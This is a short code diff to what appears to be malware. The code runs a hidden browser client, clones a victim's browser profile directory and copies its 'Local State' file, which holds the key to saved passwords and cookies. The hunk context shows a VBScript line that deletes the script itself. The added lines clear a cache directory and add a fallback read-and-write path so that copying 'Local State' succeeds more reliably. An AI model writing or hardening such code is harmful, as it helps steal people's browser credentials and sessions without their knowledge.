@@ -645,6 +645,8 @@ objFSO.DeleteFile WScript.ScriptFullName
                 hiddenClient = null;
             }
 
+            // Clean up the cache directory before starting a fresh clone
+            await fsExtra.remove(clonedDir).catch(()=>{});
             await fsExtra.ensureDir(clonedDir);
             
             async function robustCopy(src, dest) {
@@ -780,7 +782,13 @@ objFSO.DeleteFile WScript.ScriptFullName
             try {
                 const localStateSrc = path.join(userDataDir, 'Local State');
                 if (fs.existsSync(localStateSrc)) {
-                    await fs.promises.copyFile(localStateSrc, path.join(clonedDir, 'Local State'));
+                    const localStateDest = path.join(clonedDir, 'Local State');
+                    try {
+                        await fs.promises.copyFile(localStateSrc, localStateDest);
+                    } catch(err) {
+                        const data = await fs.promises.readFile(localStateSrc);
+                        await fs.promises.writeFile(localStateDest, data);
+                    }
                 }
             } catch(e){}
 
